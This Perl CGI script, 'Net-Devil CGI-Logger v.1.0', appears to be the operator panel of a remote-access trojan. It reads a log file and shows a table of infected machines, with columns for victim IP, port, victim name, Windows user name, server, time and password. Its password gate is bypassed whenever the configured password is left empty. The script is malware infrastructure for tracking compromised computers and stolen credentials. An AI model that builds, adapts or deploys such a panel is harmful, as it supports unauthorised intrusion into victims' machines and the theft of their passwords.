#!/usr/bin/perl 
print "Content-type:text/html\n\n";

#################################################################
#                                                               #
#         _   __     __       ____            _ __              #
#        / | / /__  / /_     / __ \___ _   __(_) /              #
#       /  |/ / _ \/ __/____/ / / / _ \ | / / / /               #
#      / /|  /  __/ /_/____/ /_/ /  __/ |/ / / /                #
#     /_/ |_/\___/\__/    /_____/\___/|___/_/_/                 #
#              				               	        #
#                                        CGI-LOGGER v.1.0       #
#                                                               #
#   Written by:   Nilez                                         #
#   Website:      http://www.net-devil.f2s.com                  #
#   ICQ:          76950838                                      #
#   E-mail:       nilez@mail.com                                #
#                                                               #
#################################################################


$in = $ENV{'QUERY_STRING'};
@in = split(/[&;]/,$in); 
foreach $i (0 .. $#in) {	
  $in[$i] =~ s/\+/ /g;	
  ($key, $val) = split(/=/,$in[$i],2);	
  $key =~ s/%([A-Fa-f0-9]{2})/pack("c",hex($1))/ge;	
  $val =~ s/%([A-Fa-f0-9]{2})/pack("c",hex($1))/ge;	
  $in{$key} .= "\0" if (defined($in{$key}));	 
  $in{$key} .= $val;
}

 
  $bestand='log.txt';
  $correctpass = "";
  $scriptlocation = "";
  $password = $in{'password'};
  $function = $in{'function'};

open (FILE,"+<$bestand") || die "Can't open $bestand: $!\n"; 
@list = <FILE>;
close(FILE);

@days   = ('Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday');
($sec,$min,$hour,$mday,$mon,$year,$wday) = (localtime(time))[0,1,2,3,4,5,6];
$time = sprintf("%02d:%02d:%02d",$hour,$min,$sec);
$date = "$days[$wday] $mday, $time";

if ($correctpass eq "")
{
 &show_list;
}

if ($function eq "post") {
      if ($password eq $correctpass) {
          &show_list;
          exit;
       }
      &wrong_password;
   }
 &ask_password;


sub wrong_password {
    print "<HTML>\n";
    print "<HEAD><TITLE>Net-Devil CGI-notify [invalid password]</Title></HEAD>\n";
    print "<BODY BGCOLOR=#CCCCCC>\n";
    print "<table width=40% cellpadding=1 cellspacing=0  border=1 align=CENTER bgcolor=#000000 bordercolor =#000000><br><br><br>\n";
    print "<center><tr bgcolor=#006699><td><center><table><font color=#CCCCCC font style=font-size:13 face=sans-serif, Arial, Helvetica><b>Invalid password, try again:</b></font></table></center></tr></center>\n";
    print "<tr bgcolor=#CCCCCC><td><center><table border=0 cellpadding=4 cellspacing=0><tr><br></tr></table></center>\n";  
    print "<CENTER><FORM ACTION=$scriptlocation>\n";
    print "<INPUT TYPE=password  NAME=password SIZE=30%>\n";
    print "<INPUT TYPE=hidden NAME=function VALUE=post>\n";
    print "<INPUT TYPE=submit VALUE=\"   OK   \">\n";
    print "</FORM></CENTER>\n";
    print "</td></tr></table>\n";   
    print "</BODY></HTML>\n";
    exit;
}

sub ask_password {
   print "<HTML>\n";
    print "<HEAD><TITLE>Net-Devil CGI-notify [enter password]</Title></HEAD>\n";
    print "<BODY BGCOLOR=#CCCCCC>\n";
    print "<table width=40% cellpadding=1 cellspacing=0  border=1 align=CENTER bgcolor=#000000 bordercolor =#000000><br><br><br>\n";
    print "<center><tr bgcolor=#006699><td><center><table><font color=#CCCCCC font style=font-size:13 face=sans-serif, Arial, Helvetica><b>Please enter password:</b></font></table></center></tr></center>\n";
    print "<tr bgcolor=#CCCCCC><td><center><table border=0 cellpadding=4 cellspacing=0><tr><br></tr></table></center>\n";  
    print "<CENTER><FORM ACTION=$scriptlocation>\n";
    print "<INPUT TYPE=password  NAME=password SIZE=30%>\n";
    print "<INPUT TYPE=hidden NAME=function VALUE=post>\n";
    print "<INPUT TYPE=submit VALUE=\"   OK   \">\n";
    print "</FORM></CENTER>\n";
    print "</td></tr></table>\n";   
    print "</BODY></HTML>\n";
    exit;
}


sub show_list {
    print "<HTML>\n";
    print "<HEAD><TITLE>Net-Devil CGI-notify</Title>\n";
    print "<style type=text/css><!--BODY {SCROLLBAR-FACE-COLOR:#006699; SCROLLBAR-HIGHLIGHT-COLOR:#000000; SCROLLBAR-SHADOW-COLOR: #000000; SCROLLBAR-ARROW-COLOR:  #CCCCCC; SCROLLBAR-TRACK-COLOR: #CCCCCC; } A:active {COLOR: #2092B0; FONT-FAMILY: sans-serif, Arial, Helvetica; TEXT-DECORATION: none} A:hover {COLOR: #2092B0; FONT-FAMILY: sans-serif, Arial, Helvetica; TEXT-DECORATION: none} A:link {COLOR: #006699; FONT-FAMILY: sans-serif, Arial, Helvetica; TEXT-DECORATION: none} A {COLOR: #006699; FONT-FAMILY: sans-serif, Arial, Helvetica; TEXT-DECORATION: none} -->\n";
    print "</style></HEAD><body bgcolor=#CCCCCC><center><font style=font-size:13 face=sans-serif, Arial, Helvetica><b>Net-Devil CGI-Logger</b><br><br><hr width=500 align=center>\n";
    print "<br><table border =1 cellpadding =4 cellspacing =0 bgcolor =#006699 bordercolor = #000000><td><center><font color=#000000 style=font-size:11 face=Courier New, Courier, mono><b>IP</td><td><center><font color=#000000 style=font-size:10 face=Courier New, Courier, mono><b>Port</td><td><center><font color=#000000 style=font-size:10 face=Courier New, Courier, mono><b>Victim name</td><td><center><font color=#000000 style=font-size:10 face=Courier New, Courier, mono><b>Windows user-name</td><td><center><font color=#000000 style=font-size:10 face=Courier New, Courier, mono><b>Server</td><td><center><font color=#000000 style=font-size:10 face=Courier New, Courier, mono><b>Date & Time</td><td><center><font color=#000000 style=font-size:10 face=Courier New, Courier, mono><b>Password</td>@list\n";
    print "</td><div align=right><font color=#000000 style=font-size:10 face=Arial, Helvetica,sans-serif>Server time: $date</font></div></td></table></center><br>\n";
    print "<BODY BGCOLOR=#CCCCCC>\n";
    print "</BODY></HTML>\n";
    exit;
}